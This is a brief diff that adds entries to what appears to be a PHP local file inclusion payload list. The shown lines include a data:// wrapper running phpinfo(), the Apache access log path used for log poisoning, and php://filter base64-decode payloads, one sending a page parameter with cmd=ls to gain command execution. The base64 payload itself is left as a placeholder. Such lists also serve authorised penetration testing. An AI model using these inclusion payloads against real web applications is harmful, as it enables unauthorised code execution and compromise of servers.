@@ -22,4 +22,6 @@ data:text/plain,<?php%20phpinfo();%20?>
 
 /var/log/apache2/access.log
 
+php://filter/convert.base64-decode/resource=data://plain/text,[base64 payload]
 
+page=php://filter/convert.base64-decode/resource=data://plain/text,[base64 payload]+&cmd=ls
